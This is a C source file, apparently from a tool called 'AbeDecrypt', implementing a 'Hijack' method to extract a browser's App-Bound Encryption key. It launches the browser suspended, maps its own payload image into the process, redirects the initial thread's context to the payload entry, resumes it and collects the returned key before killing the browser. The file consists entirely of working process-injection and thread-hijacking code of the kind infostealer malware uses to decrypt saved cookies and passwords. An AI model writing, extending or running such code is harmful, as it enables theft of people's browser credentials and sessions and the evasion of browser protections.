#include "AbeDecrypt.h"

/*** method: Hijack (suspended browser initial thread redirected to our payload) ***/

_Success_(return != FALSE)
BOOL
AbeGetKeyHijack(
    _In_ const NET_BROWSER_INFO* Browser,
    _Out_writes_bytes_(ABE_KEY_SIZE) PBYTE Key)
{
    PVOID Self = (PVOID)&__ImageBase;
    PROCESS_INFORMATION Pi;
    CONTEXT Ctx = { 0 };
    PVOID Mapped = NULL;
    LONG Code = (LONG)E_FAIL;
    NTSTATUS Status;
    W32ERROR Error;
    ULONGLONG Step;
    BOOL Ok;

    Step = AbeStepStart();
    Ok = AbePrepareRequest(Browser);
    AbeLogStepBool(L"Hijack", L"prepare request", Ok, Step);
    if (!Ok)
    {
        return FALSE;
    }
    Step = AbeStepStart();
    Ok = AbeCreateBrowserProcess(Browser->ExePath, CREATE_SUSPENDED, &Pi);
    Error = Ok ? ERROR_SUCCESS : Err_GetLastError();
    AbeLogStepWin32(L"Hijack", L"create suspended browser", Error, Step);
    if (!Ok)
    {
        return FALSE;
    }

    Step = AbeStepStart();
    Status = AbeMapSelf(Pi.hProcess, &Mapped);
    AbeLogStepNt(L"Hijack", L"map payload image", Status, Step);
    if (NT_SUCCESS(Status))
    {
        Ctx.ContextFlags = CONTEXT_CONTROL;
        Step = AbeStepStart();
        Status = NtGetContextThread(Pi.hThread, &Ctx);
        AbeLogStepNt(L"Hijack", L"get initial thread context", Status, Step);
        if (NT_SUCCESS(Status))
        {
            Ctx.CONTEXT_PC = (ULONG_PTR)((PBYTE)Mapped +
                                         ((ULONG_PTR)AbeHijackEntry - (ULONG_PTR)Self));
            Step = AbeStepStart();
            Status = NtSetContextThread(Pi.hThread, &Ctx);
            AbeLogStepNt(L"Hijack", L"set payload entry", Status, Step);
            if (NT_SUCCESS(Status))
            {
                Step = AbeStepStart();
                Status = NtResumeThread(Pi.hThread, NULL);
                AbeLogStepNt(L"Hijack", L"resume browser thread", Status, Step);
                if (NT_SUCCESS(Status))
                {
                    Step = AbeStepStart();
                    Code = AbeWaitRemoteResult(Pi.hProcess, Pi.hProcess, Mapped, Self, Key);
                    AbeLogStepHr(L"Hijack", L"wait payload result", (HRESULT)Code, Step);
                }
            }
        }
    }

    Step = AbeStepStart();
    Status = NtTerminateProcess(Pi.hProcess, 0);
    AbeLogStepNt(L"Hijack", L"terminate browser", Status, Step);
    NtWaitForSingleObject(Pi.hProcess, FALSE, NULL);
    NtClose(Pi.hThread);
    NtClose(Pi.hProcess);
    return Code == 0;
}
